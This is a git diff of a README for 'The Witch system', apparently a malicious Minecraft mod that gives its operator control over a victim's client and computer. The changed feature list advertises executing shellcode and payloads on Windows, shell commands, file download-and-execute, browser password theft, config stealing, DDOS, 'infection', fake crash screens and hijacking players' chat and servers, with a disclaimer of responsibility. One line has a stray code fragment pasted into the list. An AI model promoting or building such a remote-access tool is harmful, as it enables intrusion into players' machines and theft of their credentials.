@@ -11,10 +11,6 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 **I am not responsible for where you use this mod.**
 
-## Known issues
-
-- Obfuscated jar won't work
-
 ## Features
 
 ### Client
@@ -26,8 +22,8 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 ### Server
 
-- [ ] Dynamic player info view
-- [ ] Upload Download files and execute
+- [ ] Upload Download files and execute, filemgr
+- [ ] Received data panel
 - GUI
 - Mod combiner
 - Client builder
@@ -35,17 +31,19 @@ The Witch system controls Minecraft clients and grant full access to your victim
 ### System administration
 
 - [ ] Simulated shell
+- [ ] Keep java active
+- [ ] Proxy
 - System information
 - Execute x86 shellcode on Windows system
 - Shell commands
 - Execute payloads on Windows system
 - Get run arguments
-- Key Blocker
-- Proxy
+- Get JVM props
+- Key Locker
 
 ### Files & Info
 
-- [ ] More Mod config stealer
+- [ ] File manager
 - [ ] Get Browser password
 - Read text files
 
@@ -67,22 +65,22 @@ The Witch system controls Minecraft clients and grant full access to your victim
 - [ ] deop @a
 - Follow
 - Auto Lick
+- Spam / Chat control
 - Invisible player (Make the victim unable to see you)
-- Spam
 - /op @a
-- Chat control (Including unnoticeable)
 - Filter & mute chat
 - Kick people from server and prevent them from joining server
+- Force join server
 
 ### Misc
 
 - [ ] DDOS
 - [ ] Infection
 - Fake BSOD
-- Force join server
 - No quit server and close window
 - Out-of-game chat system (With your victim in game)
 - Lagger
+- Open URLadd(getStringsMenu("Open URL", "open_url", "Link"));
 
 ## Running
 
